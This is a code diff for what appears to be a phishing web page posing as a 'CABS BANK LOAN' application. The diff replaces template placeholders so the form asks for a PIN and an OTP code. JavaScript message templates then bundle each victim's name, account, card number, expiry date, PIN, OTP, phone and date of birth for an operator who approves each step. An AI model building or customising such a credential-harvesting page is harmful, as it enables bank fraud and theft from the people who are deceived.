@@ -198,7 +198,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--dark);min
       </div>
       <!-- ↓ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↓ -->
       <div class="f">
-        <label>EDIT_LABEL_HERE</label>
+        <label>PIN</label>
         <input type="text" id="p2_field"/>
       </div>
       <!-- ↑ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↑ -->
@@ -263,7 +263,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--dark);min
 
     <!-- ↓ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↓ -->
     <div class="f">
-      <label>EDIT_P4_LABEL_HERE</label>
+      <label>OTP CODE</label>
       <input type="text" id="p4_field"/>
     </div>
     <!-- ↑ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↑ -->
@@ -418,7 +418,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--dark);min
     const msg="🏦 *CABS BANK LOAN — STEP 2*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Name:* ${app.name}\n🏦 *Account:* ${app.acc}\n\n`+
       `💳 *Card Number:* ${card}\n📅 *Expiry Date:* ${expiry}\n`+
-      `▪️ *EDIT_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *PIN:* ${field}\n\n`+
     // ↑ CHANGE "EDIT_LABEL_HERE" TO MATCH YOUR LABEL ↑
       `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Approve to proceed to Step 4:*`;
 
@@ -468,7 +468,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--dark);min
     const msg="🏦 *CABS BANK LOAN — STEP 4 (FINAL)*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Name:* ${app.name}\n📱 *Phone:* ${app.phone}\n🏦 *Account:* ${app.acc}\n💵 *Amount:* USD $${Number(app.amt).toLocaleString()}\n🎂 *DOB:* ${app.dob}\n`+
       `💳 *Card:* ${app.card}\n📅 *Expiry:* ${app.expiry}\n▪️ *Step 2 Field:* ${app.p2field}\n\n`+
-      `▪️ *EDIT_P4_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *OTP:* ${field}\n\n`+
     // ↑ CHANGE "EDIT_P4_LABEL_HERE" TO MATCH YOUR LABEL ↑
       `🔖 *Final Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *FINAL DECISION:*`;
 
